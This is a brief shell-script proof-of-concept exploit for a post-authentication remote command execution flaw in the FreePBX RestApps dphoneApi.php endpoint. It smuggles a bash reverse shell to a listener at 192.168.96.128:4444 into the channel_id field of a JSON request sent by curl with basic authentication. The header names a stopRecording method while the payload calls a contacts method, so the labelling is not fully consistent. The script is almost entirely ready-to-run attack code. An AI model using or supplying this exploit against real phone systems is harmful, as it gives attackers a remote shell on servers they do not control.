# FreePBX RestApps dphoneApi.php 
# Post-Authentication Remote Command Execution in pbx.users.currentCalls.stopRecording Method

# Change these variables
HOST="192.168.96.132"
USERNAME='user'
PASSWORD='Passw0rd!!!'
COMMAND=';bash -i >& /dev/tcp/192.168.96.128/4444 0>&1;'

# Shouldn't need to change anything from here onwards
BASIC_AUTH=$(echo -n "$USERNAME:$PASSWORD" | base64 -w0)

curl -i -s -k \
    -H "Host: $HOST" \
    -H "Authorization: Basic $BASIC_AUTH" \
    -H $'User-Agent: Digium D60 2_7_0' \
    -H $'Content-Type: application/json' \
    --data-binary "{\"request\":{\"method\":\"pbx.users.contacts.add\",\"parameters\":{\"account_id\":1,\"requested_account_id\":123,\"channel_id\":\"$COMMAND\"}}}" \
    "http://$HOST/restapps/dphoneApi.php"

